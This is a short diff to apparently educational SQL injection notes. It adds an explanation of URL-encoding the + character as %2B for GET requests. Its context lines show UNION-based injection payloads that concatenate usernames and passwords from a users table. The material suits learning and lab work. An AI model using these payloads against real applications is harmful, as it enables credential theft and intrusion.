@@ -21,3 +21,6 @@ Or we can concatenate both strings like that
 ' union select null,username||password from users--
 
 ' union select null,username||':'||password from users-- [To differentiate between two strings.]
+
+
+When sending a GET request, the + character is often interpreted as a space in URL encoding. To send a + character in a URL, you should encode it properly. The URL-encoded representation of + is %2B.
